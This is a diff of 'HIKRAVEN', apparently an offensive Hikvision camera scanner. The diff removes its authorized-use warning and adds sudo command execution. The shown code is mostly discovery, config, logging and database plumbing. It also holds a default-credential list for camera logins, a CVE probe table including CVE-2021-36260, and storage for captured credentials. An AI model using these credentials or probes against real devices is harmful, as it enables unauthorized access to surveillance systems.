@@ -1,13 +1,4 @@
 #!/usr/bin/env python3
-"""
-HIKRAVEN - Advanced Hikvision Security Assessment Platform
-Version: 5.1.0 - Professional Edition
-Author: SYLHETYHACKVENGER (THE-ERROR808)
-License: Educational/Research Use Only
-
-WARNING: This tool is for authorized security testing only!
-Unauthorized use is illegal and unethical.
-"""
 
 import argparse
 import asyncio
@@ -52,7 +43,6 @@ import platform
 import netifaces
 import psutil
 
-# Third-party imports
 try:
     import requests
     from requests.adapters import HTTPAdapter
@@ -88,26 +78,17 @@ except ImportError as e:
     print("Install with: pip install requests scapy lxml cryptography colorama pyyaml tqdm packaging rich netifaces psutil")
     sys.exit(1)
 
-# Suppress warnings
 warnings.filterwarnings('ignore', category=InsecureRequestWarning)
 warnings.filterwarnings('ignore', category=DeprecationWarning)
 
-# Initialize colorama and rich console
 just_fix_windows_console()
 init(autoreset=True)
 console = Console()
 
-# ==================== VERSION ====================
-__version__ = "5.1.0"
 __author__ = "SYLHETYHACKVENGER (THE-ERROR808)"
 __description__ = "Advanced Hikvision Security Assessment Tool - Professional Edition"
 
-# ==================== CONSTANTS ====================
-
 class Constants:
-    """Global constants"""
-    
-    # Network
     DEFAULT_TIMEOUT = 10
     MAX_THREADS = 100
     SCAN_TIMEOUT = 30
@@ -115,7 +96,6 @@ class Constants:
     MAX_RETRIES = 3
     RATE_LIMIT = 20
     
-    # Paths
     DB_PATH = "hikraven.db"
     LOG_PATH = "hikraven.log"
     OUTPUT_DIR = "reports"
@@ -124,13 +104,11 @@ class Constants:
     CACHE_DIR = ".cache"
     PLUGIN_DIR = "plugins"
     
-    # Ports
     COMMON_PORTS = [80, 443, 554, 8000, 37020, 8443, 8080, 9090, 7001, 7002, 8554, 10554, 37777, 37778]
     HIKVISION_PORTS = [80, 443, 554, 8000, 37020, 8443, 37777, 37778]
     RTSP_PORTS = [554, 8554, 10554, 8554, 37777]
     HTTP_PORTS = [80, 8080, 8000, 8443, 37777]
     
-    # MAC OUIs - Extended
     HIKVISION_OUIS = {
         'c4:2f:90': 'Hikvision', 'c0:56:e3': 'Hikvision', 'bc:ad:28': 'Hikvision',
         'b4:a3:82': 'Hikvision', 'a4:14:37': 'Hikvision', '54:c4:15': 'Hikvision',
@@ -147,7 +125,6 @@ class Constants:
         '6c:5a:b0': 'Hikvision', '5c:2c:39': 'Hikvision', '4c:0d:9e': 'Hikvision'
     }
     
-    # Default credentials - Extended
     DEFAULT_CREDS = [
         ("admin", "12345"), ("admin", "123456"), ("admin", "hikvision"),
         ("admin", "admin12345"), ("admin", "password"), ("admin", "123456789"),
@@ -167,7 +144,6 @@ class Constants:
         ("operator", "12345"), ("operator", "operator"), ("viewer", "viewer")
     ]
     
-    # CVE Signatures - Extended
     CVE_SIGNATURES = {
         "CVE-2021-36260": {
             "path": "/SDK/webLanguage",
@@ -294,10 +270,8 @@ class Constants:
         }
     }
     
-    # Severity levels
     SEVERITY_ORDER = ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]
     
-    # Threat categories
     THREAT_CATEGORIES = {
         "RCE": "Remote Code Execution",
         "Auth Bypass": "Authentication Bypass",
@@ -308,59 +282,103 @@ class Constants:
         "Default Creds": "Default Credentials"
     }
 
-# ==================== EXCEPTIONS ====================
-
 class HikRavenError(Exception):
-    """Base exception for HikRaven"""
     pass
 
 class DiscoveryError(HikRavenError):
-    """Error during device discovery"""
     pass
 
 class VulnerabilityError(HikRavenError):
-    """Error during vulnerability scanning"""
     pass
 
 class ExploitationError(HikRavenError):
-    """Error during exploitation"""
     pass
 
 class DatabaseError(HikRavenError):
-    """Error during database operations"""
     pass
 
 class PluginError(HikRavenError):
-    """Error during plugin execution"""
     pass
 
 class InterfaceError(HikRavenError):
-    """Error with network interface"""
     pass
 
-# ==================== INTERFACE MANAGEMENT ====================
-
-class InterfaceManager:
-    """Enhanced network interface management with cross-platform support"""
-    
+class SudoManager:
     def __init__(self, logger=None):
         self.logger = logger
+        self.has_sudo = self._check_sudo()
+        self.elevated = False
+        
+    def _check_sudo(self) -> bool:
+        try:
+            if os.name == 'nt':
+                import ctypes
+                return ctypes.windll.shell32.IsUserAnAdmin() != 0
+            else:
+                return os.geteuid() == 0
+        except:
+            return False
+    
+    def elevate(self) -> bool:
+        if self.has_sudo:
+            self.elevated = True
+            if self.logger:
+                self.logger.info("Running with elevated privileges")
+            return True
+        
+        if self.logger:
+            self.logger.warning("No elevated privileges detected")
+            self.logger.warning("Some features may be limited")
+        return False
+    
+    def run_with_sudo(self, cmd: List[str]) -> Tuple[int, str, str]:
+        if self.has_sudo:
+            try:
+                process = subprocess.Popen(
+                    ['sudo'] + cmd,
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE,
+                    text=True
+                )
+                stdout, stderr = process.communicate(timeout=30)
+                return process.returncode, stdout, stderr
+            except subprocess.TimeoutExpired:
+                process.kill()
+                return -1, "", "Timeout"
+            except Exception as e:
+                return -1, "", str(e)
+        else:
+            try:
+                process = subprocess.Popen(
+                    cmd,
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE,
+                    text=True
+                )
+                stdout, stderr = process.communicate(timeout=30)
+                return process.returncode, stdout, stderr
+            except subprocess.TimeoutExpired:
+                process.kill()
+                return -1, "", "Timeout"
+            except Exception as e:
+                return -1, "", str(e)
+
+class InterfaceManager:
+    def __init__(self, logger=None, sudo_manager=None):
+        self.logger = logger
+        self.sudo_manager = sudo_manager or SudoManager(logger)
         self.interfaces = {}
         self._scan_interfaces()
     
     def _scan_interfaces(self):
-        """Scan all available network interfaces"""
         try:
-            # Use netifaces for cross-platform interface detection
             for iface_name in netifaces.interfaces():
                 iface_info = netifaces.ifaddresses(iface_name)
                 
-                # Get MAC address
                 mac = None
                 if netifaces.AF_LINK in iface_info:
                     mac = iface_info[netifaces.AF_LINK][0].get('addr')
                 
-                # Get IPv4 addresses
                 ipv4 = []
                 if netifaces.AF_INET in iface_info:
                     for addr in iface_info[netifaces.AF_INET]:
@@ -370,7 +388,6 @@ class InterfaceManager:
                             'broadcast': addr.get('broadcast')
                         })
                 
-                # Get IPv6 addresses
                 ipv6 = []
                 if netifaces.AF_INET6 in iface_info:
                     for addr in iface_info[netifaces.AF_INET6]:
@@ -379,7 +396,6 @@ class InterfaceManager:
                             'netmask': addr.get('netmask')
                         })
                 
-                # Get interface status
                 is_up = self._is_interface_up(iface_name)
                 is_loopback = iface_name == 'lo' or iface_name.startswith('lo')
                 is_virtual = self._is_virtual_interface(iface_name)
@@ -404,20 +420,16 @@ class InterfaceManager:
         except Exception as e:
             if self.logger:
                 self.logger.debug(f"Interface scan error: {e}")
-            # Fallback to socket methods
             self._fallback_interface_scan()
     
     def _is_interface_up(self, iface_name: str) -> bool:
-        """Check if interface is up"""
         try:
-            # Use psutil for cross-platform status
             for iface, stats in psutil.net_if_stats().items():
                 if iface == iface_name:
                     return stats.isup
         except:
             pass
         
-        # Fallback to system commands
         try:
             if platform.system() == 'Windows':
                 result = subprocess.run(
@@ -439,7 +451,6 @@ class InterfaceManager:
             return False
     
     def _is_virtual_interface(self, iface_name: str) -> bool:
-        """Check if interface is virtual"""
         virtual_patterns = [
             'docker', 'veth', 'br-', 'vlan', 'tun', 'tap', 
             'vmnet', 'vmware', 'virtual', 'vbox', 'wsl', 'bond'
@@ -447,7 +458,6 @@ class InterfaceManager:
         return any(pattern in iface_name.lower() for pattern in virtual_patterns)
     
     def _get_interface_speed(self, iface_name: str) -> Optional[int]:
-        """Get interface speed in Mbps"""
         try:
             if iface_name in psutil.net_if_stats():
                 return psutil.net_if_stats()[iface_name].speed
@@ -456,7 +466,6 @@ class InterfaceManager:
         return None
     
     def _get_interface_mtu(self, iface_name: str) -> Optional[int]:
-        """Get interface MTU"""
         try:
             if iface_name in psutil.net_if_stats():
                 return psutil.net_if_stats()[iface_name].mtu
@@ -465,10 +474,8 @@ class InterfaceManager:
         return None
     
     def _get_interface_type(self, iface_name: str, mac: str = None) -> str:
-        """Determine interface type"""
         iface_type = 'unknown'
         
-        # Check based on name
         name_lower = iface_name.lower()
         if 'eth' in name_lower or 'enp' in name_lower or 'ens' in name_lower:
             iface_type = 'ethernet'
@@ -489,10 +496,8 @@ class InterfaceManager:
         elif 'usb' in name_lower:
             iface_type = 'usb'
         
-        # Check MAC OUI if available
         if mac and iface_type == 'unknown':
             mac_prefix = mac.lower()[:8]
-            # Check for common virtual MAC patterns
             if mac_prefix.startswith('00:05:69') or mac_prefix.startswith('00:0c:29'):
                 iface_type = 'vmware'
             elif mac_prefix.startswith('00:15:5d') or mac_prefix.startswith('00:50:56'):
@@ -505,15 +510,12 @@ class InterfaceManager:
         return iface_type
     
     def _fallback_interface_scan(self):
-        """Fallback interface scan using socket"""
         try:
-            # Get all interfaces via socket
             import socket
             import fcntl
             import struct
             
             if platform.system() != 'Windows':
-                # Unix-like systems
                 SIOCGIFCONF = 0x8912
                 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                 buf = 4096
@@ -542,7 +544,6 @@ class InterfaceManager:
                         }
                 sock.close()
         except:
-            # Last resort: use gethostname
             try:
                 hostname = socket.gethostname()
                 ip = socket.gethostbyname(hostname)
@@ -562,11 +563,9 @@ class InterfaceManager:
                 pass
     
     def get_interface(self, name: str) -> Optional[Dict]:
-        """Get interface by name"""
         return self.interfaces.get(name)
     
     def get_interface_by_ip(self, ip: str) -> Optional[str]:
-        """Find interface by IP address"""
         for iface_name, iface_info in self.interfaces.items():
             for addr in iface_info['ipv4']:
                 if addr['address'] == ip:
@@ -574,21 +573,16 @@ class InterfaceManager:
         return None
     
     def get_active_interfaces(self) -> List[Dict]:
-        """Get all active interfaces"""
         return [info for info in self.interfaces.values() if info['is_up'] and not info['is_loopback']]
     
     def get_physical_interfaces(self) -> List[Dict]:
-        """Get physical (non-virtual) interfaces"""
         return [info for info in self.interfaces.values() 
                 if info['is_up'] and not info['is_loopback'] and not info['is_virtual']]
     
     def get_interface_names(self) -> List[str]:
-        """Get all interface names"""
         return list(self.interfaces.keys())
     
     def get_primary_ip(self) -> Tuple[str, str]:
-        """Get primary interface and IP"""
-        # Try to find default route interface
         try:
             gateway_iface = netifaces.gateways()['default'][netifaces.AF_INET][1]
             if gateway_iface in self.interfaces:
@@ -598,18 +592,15 @@ class InterfaceManager:
         except:
             pass
         
-        # Fallback to first active physical interface
         for iface_name, iface_info in self.interfaces.items():
             if iface_info['is_up'] and not iface_info['is_loopback'] and not iface_info['is_virtual']:
                 for addr in iface_info['ipv4']:
                     if addr['address'] and not addr['address'].startswith('127.'):
                         return iface_name, addr['address']
         
-        # Last resort
         return 'default', '127.0.0.1'
     
     def get_ip_from_interface(self, iface_name: str) -> Optional[str]:
-        """Get primary IP address for interface"""
         iface = self.get_interface(iface_name)
         if iface and iface['ipv4']:
             for addr in iface['ipv4']:
@@ -618,12 +609,10 @@ class InterfaceManager:
         return None
     
     def get_mac_from_interface(self, iface_name: str) -> Optional[str]:
-        """Get MAC address for interface"""
         iface = self.get_interface(iface_name)
         return iface['mac'] if iface else None
     
     def get_interface_stats(self, iface_name: str) -> Dict:
-        """Get detailed interface statistics"""
         stats = {}
         try:
             if iface_name in psutil.net_if_stats():
@@ -636,7 +625,6 @@ class InterfaceManager:
                     'flags': str(net_stats.flags)
                 })
             
-            # Get IO stats
             io_stats = psutil.net_io_counters(pernic=True)
             if iface_name in io_stats:
                 stats.update({
@@ -654,13 +642,10 @@ class InterfaceManager:
         return stats
     
     def get_interface_peers(self, iface_name: str, timeout: int = 2) -> List[Dict]:
-        """Get devices detected on interface"""
         devices = []
         try:
-            # Get MAC addresses from ARP cache
             arp_cache = {}
             try:
-                # Windows
                 if platform.system() == 'Windows':
                     result = subprocess.run(['arp', '-a'], capture_output=True, text=True, timeout=timeout)
                     for line in result.stdout.split('\n'):
@@ -672,8 +657,18 @@ class InterfaceManager:
                             if 'dynamic' in status.lower() or 'static' in status.lower():
                                 arp_cache[ip] = mac
                 else:
-                    result = subprocess.run(['ip', 'neigh', 'show'], capture_output=True, text=True, timeout=timeout)
-                    for line in result.stdout.split('\n'):
+                    if self.sudo_manager and self.sudo_manager.has_sudo:
+                        result = self.sudo_manager.run_with_sudo(['ip', 'neigh', 'show'])
+                        if result[0] == 0:
+                            stdout = result[1]
+                        else:
+                            result = subprocess.run(['ip', 'neigh', 'show'], capture_output=True, text=True, timeout=timeout)
+                            stdout = result.stdout
+                    else:
+                        result = subprocess.run(['ip', 'neigh', 'show'], capture_output=True, text=True, timeout=timeout)
+                        stdout = result.stdout
+                    
+                    for line in stdout.split('\n'):
                         parts = line.strip().split()
                         if len(parts) >= 3 and '.' in parts[0] and ':' in parts[2]:
                             ip = parts[0]
@@ -684,7 +679,6 @@ class InterfaceManager:
             except:
                 pass
             
-            # Convert to list
             for ip, mac in arp_cache.items():
                 devices.append({
                     'ip': ip,
@@ -698,15 +692,11 @@ class InterfaceManager:
         return devices
     
     def validate_interface(self, iface_name: str) -> bool:
-        """Validate interface exists and is up"""
         if iface_name not in self.interfaces:
             return False
         return self.interfaces[iface_name]['is_up']
 
-# ==================== UTILITY FUNCTIONS ====================
-
 def timing_decorator(func):
-    """Decorator to time function execution"""
     @wraps(func)
     def wrapper(*args, **kwargs):
         start = time.time()
@@ -718,7 +708,6 @@ def timing_decorator(func):
     return wrapper
 
 def safe_operation(default=None):
-    """Decorator for safe operation with error handling"""
     def decorator(func):
         @wraps(func)
         def wrapper(*args, **kwargs):
@@ -732,7 +721,6 @@ def safe_operation(default=None):
     return decorator
 
 def generate_device_fingerprint(device: 'HikDevice') -> str:
-    """Generate a unique fingerprint for a device"""
     components = [
         device.mac_address or '',
         device.serial_number or '',
@@ -744,7 +732,6 @@ def generate_device_fingerprint(device: 'HikDevice') -> str:
     return hashlib.sha256(fingerprint_data.encode()).hexdigest()[:16]
 
 def is_ip_valid(ip: str) -> bool:
-    """Validate IP address"""
     try:
         ipaddress.ip_address(ip)
         return True
@@ -752,12 +739,10 @@ def is_ip_valid(ip: str) -> bool:
         return False
 
 def is_mac_valid(mac: str) -> bool:
-    """Validate MAC address"""
     pattern = r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$'
     return bool(re.match(pattern, mac))
 
 def get_local_ip() -> str:
-    """Get local IP address"""
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.connect(('8.8.8.8', 80))
@@ -768,7 +753,6 @@ def get_local_ip() -> str:
         return '127.0.0.1'
 
 def get_mac_from_ip(ip: str) -> Optional[str]:
-    """Get MAC address from IP using ARP"""
     try:
         packet = scapy.ARP(pdst=ip)
         result = scapy.srp(packet, timeout=2, verbose=False)[0]
@@ -779,24 +763,20 @@ def get_mac_from_ip(ip: str) -> Optional[str]:
     return None
 
 def generate_secure_password(length: int = 16) -> str:
-    """Generate a secure random password"""
     chars = string.ascii_letters + string.digits + "!@#$%^&*()_+-="
     return ''.join(secrets.choice(chars) for _ in range(length))
 
 def chunks(lst: List, n: int):
-    """Yield successive n-sized chunks from lst"""
     for i in range(0, len(lst), n):
         yield lst[i:i + n]
 
 def safe_parse_xml(data: bytes) -> Optional[ET.Element]:
-    """Safely parse XML data"""
     try:
         return ET.fromstring(data)
     except ET.ParseError:
         return None
 
 def format_bytes(size: int) -> str:
-    """Format bytes to human readable"""
     for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
         if size < 1024.0:
             return f"{size:.1f} {unit}"
@@ -804,15 +784,12 @@ def format_bytes(size: int) -> str:
     return f"{size:.1f} PB"
 
 def sanitize_filename(filename: str) -> str:
-    """Sanitize filename"""
     return re.sub(r'[^a-zA-Z0-9\-_.]', '_', filename)
 
 def get_timestamp() -> str:
-    """Get timestamp for filenames"""
     return datetime.now().strftime("%Y%m%d_%H%M%S")
 
 def detect_platform() -> Dict[str, str]:
-    """Detect platform details"""
     return {
         'system': platform.system(),
         'release': platform.release(),
@@ -822,11 +799,7 @@ def detect_platform() -> Dict[str, str]:
         'hostname': socket.gethostname()
     }
 
-# ==================== CONFIGURATION ====================
-
 class ConfigManager:
-    """Enhanced configuration management"""
-    
     def __init__(self, config_path: str = Constants.CONFIG_PATH):
         self.config_path = config_path
         self.config = self._default_config()
@@ -834,9 +807,7 @@ class ConfigManager:
         self._validate()
     
     def _default_config(self) -> dict:
-        """Return default configuration"""
         return {
-            'version': __version__,
             'general': {
                 'name': 'HIKRAVEN',
                 'company': 'Security Research Team'
@@ -933,7 +904,6 @@ class ConfigManager:
         }
     
     def load(self) -> dict:
-        """Load configuration from file"""
         if os.path.exists(self.config_path):
             try:
                 with open(self.config_path, 'r') as f:
@@ -944,7 +914,6 @@ class ConfigManager:
         return self.config
     
     def save(self) -> bool:
-        """Save configuration to file"""
         try:
             os.makedirs(os.path.dirname(self.config_path) or '.', exist_ok=True)
             with open(self.config_path, 'w') as f:
@@ -955,7 +924,6 @@ class ConfigManager:
             return False
     
     def _deep_merge(self, base: dict, override: dict) -> dict:
-        """Deep merge two dictionaries"""
         result = base.copy()
         for key, value in override.items():
             if key in result and isinstance(result[key], dict) and isinstance(value, dict):
@@ -965,15 +933,12 @@ class ConfigManager:
         return result
     
     def _validate(self):
-        """Validate configuration"""
-        # Validate required fields
         required = ['scan', 'discovery', 'vulnerability', 'reporting']
         for key in required:
             if key not in self.config:
                 self.config[key] = self._default_config()[key]
     
     def get(self, key: str, default=None):
-        """Get configuration value using dot notation"""
         parts = key.split('.')
         current = self.config
         for part in parts:
@@ -984,7 +949,6 @@ class ConfigManager:
         return current
     
     def set(self, key: str, value: Any):
-        """Set configuration value using dot notation"""
         parts = key.split('.')
         current = self.config
         for part in parts[:-1]:
@@ -993,11 +957,7 @@ class ConfigManager:
             current = current[part]
         current[parts[-1]] = value
 
-# ==================== LOGGING ====================
-
 class Logger:
-    """Professional logging system with rich formatting"""
-    
     def __init__(self, log_file: str = Constants.LOG_PATH, 
                  level: str = 'INFO', verbose: bool = False,
                  console_output: bool = True):
@@ -1006,23 +966,19 @@ class Logger:
         self.logger = logging.getLogger('HikRaven')
         self.logger.setLevel(logging.DEBUG if verbose else getattr(logging, level.upper()))
         
-        # Clear existing handlers
         self.logger.handlers.clear()
         
-        # File handler with rotation
         file_handler = logging.FileHandler(log_file)
         file_handler.setLevel(logging.DEBUG)
         file_format = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
         file_handler.setFormatter(file_format)
         self.logger.addHandler(file_handler)
         
-        # Console handler
         if console_output:
             console_handler = logging.StreamHandler()
             console_handler.setLevel(logging.DEBUG if verbose else logging.INFO)
             self.logger.addHandler(console_handler)
         
-        # Setup signal handler
         signal.signal(signal.SIGINT, self._signal_handler)
         signal.signal(signal.SIGTERM, self._signal_handler)
         
@@ -1030,16 +986,13 @@ class Logger:
         self._last_progress = ""
     
     def _signal_handler(self, signum, frame):
-        """Handle interrupt signals"""
         self._stopped = True
         self.warning("Received interrupt signal, cleaning up...")
     
     def _log(self, level: str, msg: str, *args, **kwargs):
-        """Internal log method"""
         if self._stopped:
             return
         
-        # Skip progress message if same as last
         if level == 'PROGRESS' and msg == self._last_progress:
             return
         
@@ -1072,14 +1025,12 @@ class Logger:
         self._log('INFO', f"[★] {msg}")
     
     def section(self, msg: str):
-        """Display section header"""
         self._log('INFO', f"\n{'='*70}")
         self._log('INFO', f"  {msg}")
         self._log('INFO', f"{'='*70}")
     
     def progress(self, current: int, total: int, msg: str = "", 
                  bar_length: int = 30):
-        """Display progress bar"""
         if total <= 0:
             return
         percent = (current / total) * 100
@@ -1089,7 +1040,6 @@ class Logger:
     
     def table(self, headers: List[str], rows: List[List[Any]], 
               title: str = None):
-        """Display a formatted table using rich"""
         if not self.console_output:
             return
         
@@ -1103,17 +1053,14 @@ class Logger:
             
             console.print(table)
         except:
-            # Fallback to simple table
             if title:
                 self._log('INFO', f"\n{title}")
             
-            # Calculate column widths
             col_widths = [len(h) for h in headers]
             for row in rows:
                 for i, cell in enumerate(row):
                     col_widths[i] = max(col_widths[i], len(str(cell)))
             
-            # Build table
             separator = '+' + '+'.join('-' * (w + 2) for w in col_widths) + '+'
             header_row = '|' + '|'.join(f' {h:^{col_widths[i]}} ' 
                                        for i, h in enumerate(headers)) + '|'
@@ -1130,25 +1077,18 @@ class Logger:
             self._log('INFO', separator)
     
     def rich_panel(self, content: str, title: str = "", border_style: str = "cyan"):
-        """Display content in a rich panel"""
         if self.console_output:
             panel = Panel(content, title=title, border_style=border_style)
             console.print(panel)
     
     def rich_status(self, message: str):
-        """Display status message"""
         if self.console_output:
             console.status(f"[bold cyan]{message}[/bold cyan]")
     
     def stop(self):
-        """Stop logging"""
         self._stopped = True
 
-# ==================== DATABASE ====================
-
 class Database:
-    """Enhanced database with encryption and backup"""
-    
     def __init__(self, db_path: str = Constants.DB_PATH, 
                  encrypt: bool = True):
         self.db_path = db_path
@@ -1162,12 +1102,10 @@ class Database:
         self._init_database()
     
     def _init_encryption(self):
-        """Initialize encryption"""
         key = self._get_or_create_key()
         self.cipher = Fernet(key)
     
     def _get_or_create_key(self) -> bytes:
-        """Get or create encryption key"""
         key_file = Constants.KEY_FILE
         if os.path.exists(key_file):
             with open(key_file, 'rb') as f:
@@ -1180,7 +1118,6 @@ class Database:
             return key
     
     def _encrypt(self, data: str) -> str:
-        """Encrypt sensitive data"""
         if not self.encrypt or not data:
             return data
         try:
@@ -1189,7 +1126,6 @@ class Database:
             return data
     
     def _decrypt(self, data: str) -> str:
-        """Decrypt sensitive data"""
         if not self.encrypt or not data:
             return data
         try:
@@ -1198,8 +1134,6 @@ class Database:
             return data
     
     def _init_database(self):
-        """Initialize database schema"""
-        # Check and backup if needed
         self._check_backup()
         
         with sqlite3.connect(self.db_path) as conn:
@@ -1209,7 +1143,6 @@ class Database:
             
             cursor = conn.cursor()
             
-            # Devices table
             cursor.execute("""
                 CREATE TABLE IF NOT EXISTS devices (
                     id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -1235,7 +1168,6 @@ class Database:
                 )
             """)
             
-            # Vulnerabilities table
             cursor.execute("""
                 CREATE TABLE IF NOT EXISTS vulnerabilities (
                     id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -1253,7 +1185,6 @@ class Database:
                 )
             """)
             
-            # Scan history
             cursor.execute("""
                 CREATE TABLE IF NOT EXISTS scan_history (
                     id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -1269,7 +1200,6 @@ class Database:
                 )
             """)
             
-            # Credentials (encrypted)
             cursor.execute("""
                 CREATE TABLE IF NOT EXISTS credentials (
                     id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -1282,7 +1212,6 @@ class Database:
                 )
             """)
             
-            # Ports
             cursor.execute("""
                 CREATE TABLE IF NOT EXISTS ports (
                     id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -1295,7 +1224,6 @@ class Database:
                 )
             """)
             
-            # Metrics
             cursor.execute("""
                 CREATE TABLE IF NOT EXISTS metrics (
                     id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -1307,7 +1235,6 @@ class Database:
                 )
             """)
             
-            # Logs
             cursor.execute("""
                 CREATE TABLE IF NOT EXISTS logs (
                     id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -1318,7 +1245,6 @@ class Database:
                 )
             """)
             
-            # Network interfaces
             cursor.execute("""
                 CREATE TABLE IF NOT EXISTS interfaces (
                     id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -1331,7 +1257,6 @@ class Database:
                 )
             """)
             
-            # Create indexes
             cursor.execute("CREATE INDEX IF NOT EXISTS idx_devices_ip ON devices(ip_address)")
             cursor.execute("CREATE INDEX IF NOT EXISTS idx_devices_mac ON devices(mac_address)")
             cursor.execute("CREATE INDEX IF NOT EXISTS idx_devices_fingerprint ON devices(fingerprint)")
@@ -1344,15 +1269,12 @@ class Database:
     
     @safe_operation(default=0)
     def save_device(self, device: 'HikDevice') -> int:
-        """Save or update device information"""
         with sqlite3.connect(self.db_path) as conn:
             cursor = conn.cursor()
             
-            # Generate fingerprint if not present
             if not device.fingerprint:
                 device.fingerprint = generate_device_fingerprint(device)
             
-            # Calculate severity score
             severity_score = device.get_severity_score()
             threat_level = self._get_threat_level(severity_score)
             
@@ -1384,7 +1306,6 @@ class Database:
             
             device_id = cursor.lastrowid
             
-            # Save ports
             if device.open_ports:
                 cursor.execute("DELETE FROM ports WHERE device_id = ?", (device_id,))
                 for port in device.open_ports:
@@ -1393,7 +1314,6 @@ class Database:
                         VALUES (?, ?, ?, ?)
                     """, (device_id, port, 'tcp', self._get_service_name(port)))
             
-            # Save credentials
             if device.credentials:
                 cursor.execute("DELETE FROM credentials WHERE device_id = ?", (device_id,))
                 for username, password in device.credentials:
@@ -1407,7 +1327,6 @@ class Database:
             return device_id
     
     def _get_threat_level(self, score: int) -> str:
-        """Get threat level from severity score"""
         if score >= 20:
             return "CRITICAL"
         elif score >= 10:
@@ -1419,7 +1338,6 @@ class Database:
         return "INFO"
     
     def _get_service_name(self, port: int) -> str:
-        """Get service name for port"""
         services = {
             80: 'http', 443: 'https', 554: 'rtsp', 8000: 'hikvision',
             37020: 'hikvision-probe', 8443: 'https-alt', 8080: 'http-alt',
@@ -1430,11 +1348,9 @@ class Database:
     
     @safe_operation()
     def save_vulnerability(self, device_ip: str, vuln_data: dict):
-        """Save vulnerability finding"""
         with sqlite3.connect(self.db_path) as conn:
             cursor = conn.cursor()
             
-            # Get device ID
             cursor.execute("SELECT id FROM devices WHERE ip_address = ?", (device_ip,))
             result = cursor.fetchone()
             if not result:
@@ -1461,38 +1377,31 @@ class Database:
     
     @safe_operation(default={})
     def get_statistics(self) -> dict:
-        """Get scan statistics"""
         with sqlite3.connect(self.db_path) as conn:
             cursor = conn.cursor()
             stats = {}
             
-            # Total devices
             cursor.execute("SELECT COUNT(*) FROM devices")
             stats['total_devices'] = cursor.fetchone()[0]
             
-            # Vulnerable devices
             cursor.execute("SELECT COUNT(DISTINCT device_id) FROM vulnerabilities")
             stats['vulnerable_devices'] = cursor.fetchone()[0] or 0
             
-            # Total vulnerabilities
             cursor.execute("SELECT COUNT(*) FROM vulnerabilities")
             stats['total_vulnerabilities'] = cursor.fetchone()[0]
             
-            # By severity
             cursor.execute("""
                 SELECT severity, COUNT(*) FROM vulnerabilities 
                 GROUP BY severity
             """)
             stats['by_severity'] = dict(cursor.fetchall())
             
-            # By category
             cursor.execute("""
                 SELECT category, COUNT(*) FROM vulnerabilities 
                 GROUP BY category
             """)
             stats['by_category'] = dict(cursor.fetchall())
             
-            # Last scan
             cursor.execute("""
                 SELECT scan_time, total_devices, vulnerable_devices, 
                        total_vulnerabilities, duration_seconds, network_range, interface
@@ -1511,7 +1420,6 @@ class Database:
                     'interface': result[6]
                 }
             
-            # Port statistics
             cursor.execute("""
                 SELECT port, COUNT(*) as count 
                 FROM ports 
@@ -1521,7 +1429,6 @@ class Database:
             """)
             stats['common_ports'] = cursor.fetchall()
             
-            # CVE statistics
             cursor.execute("""
                 SELECT cve_id, COUNT(*) as count
                 FROM vulnerabilities
@@ -1533,15 +1440,13 @@ class Database:
             return stats
     
     def _check_backup(self):
-        """Check and backup database if needed"""
         if not os.path.exists(self.db_path):
             return
         
         size_mb = os.path.getsize(self.db_path) / (1024 * 1024)
-        if size_mb > 100:  # 100MB
+        if size_mb > 100:
             backup_path = f"{self.db_path}.{get_timestamp()}.bak"
             shutil.copy2(self.db_path, backup_path)
-            # Compress backup
             try:
                 with open(backup_path, 'rb') as f:
                     compressed = zlib.compress(f.read())
@@ -1552,19 +1457,12 @@ class Database:
                 pass
     
     def close(self):
-        """Close database connection"""
         pass
-
-# ==================== DEVICE CLASSES ====================
 
 @dataclass
 class HikDevice:
-    """Hikvision device representation"""
-    
-    # Required
     ip_address: str
     
-    # Optional device info
     mac_address: Optional[str] = None
     hostname: Optional[str] = None
     description: Optional[str] = None
@@ -1577,15 +1475,12 @@ class HikDevice:
     activation_status: Optional[str] = None
     password_reset_ability: Optional[str] = None
     
-    # Network info
     open_ports: List[int] = field(default_factory=list)
     services: Dict[int, str] = field(default_factory=dict)
     
-    # Security findings
     vulnerabilities: List[dict] = field(default_factory=list)
     credentials: List[Tuple[str, str]] = field(default_factory=list)
     
-    # Metadata
     first_seen: float = field(default_factory=time.time)
     last_seen: float = field(default_factory=time.time)
     confidence: float = 1.0
@@ -1596,12 +1491,10 @@ class HikDevice:
     interface: str = ""
     
     def __post_init__(self):
-        """Initialize after creation"""
         if not self.fingerprint:
             self.fingerprint = generate_device_fingerprint(self)
     
     def to_dict(self) -> dict:
-        """Convert to dictionary"""
         return {
             'ip_address': self.ip_address,
             'mac_address': self.mac_address,
@@ -1631,7 +1524,6 @@ class HikDevice:
     def add_vulnerability(self, cve_id: str, severity: str, 
                          description: str, cvss_score: float = 0.0, 
                          proof: str = "", category: str = "UNKNOWN"):
-        """Add vulnerability to device"""
         vuln = {
             'cve_id': cve_id,
             'severity': severity,
@@ -1644,11 +1536,9 @@ class HikDevice:
         self.vulnerabilities.append(vuln)
     
     def get_vulnerability_count(self) -> int:
-        """Get number of vulnerabilities"""
         return len(self.vulnerabilities)
     
     def get_severity_score(self) -> int:
-        """Calculate severity score"""
         if not self.vulnerabilities:
             return 0
         
@@ -1666,7 +1556,6 @@ class HikDevice:
         return score
     
     def get_threat_level(self) -> str:
-        """Get threat level"""
         score = self.get_severity_score()
         if score >= 20:
             return "CRITICAL"
@@ -1679,8 +1568,6 @@ class HikDevice:
         return "INFO"
     
     def merge(self, other: 'HikDevice'):
-        """Merge information from another device"""
-        # Update fields if not set
         if other.mac_address and not self.mac_address:
             self.mac_address = other.mac_address
         if other.hostname and not self.hostname:
@@ -1698,43 +1585,34 @@ class HikDevice:
